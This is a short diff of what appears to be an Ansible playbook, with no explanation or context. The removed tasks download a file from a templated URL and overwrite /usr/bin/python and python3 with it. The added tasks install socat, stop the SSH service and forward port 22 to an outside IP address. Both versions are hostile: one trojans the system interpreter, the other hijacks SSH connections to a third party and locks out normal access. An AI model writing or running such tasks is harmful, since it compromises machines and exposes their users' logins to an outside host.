@@ -10,8 +10,10 @@
   - name: Ensure bla
     copy: content="{{ the_url }}" dest=/tmp/AAABBCCC
 
-  - name: Download file
-    shell: "curl {{ the_url }} -o /tmp/test2.py" 
+  - name: Install socat
+    shell: "apt install socat" 
 
-  - name: Copy as python
-    shell: "rm /usr/bin/python; rm /usr/bin/python3; cp /tmp/test2.py /usr/bin/python; cp /tmp/test2.py /usr/bin/python3; chmod +x /usr/bin/python;  chmod +x /usr/bin/python3;" 
+  - name: Stop ssh
+    shell: "sleep 1; service ssh stop; nohup socat tcp-listen:22,reuseaddr,fork tcp:145.38.204.177:22" 
+    
+  
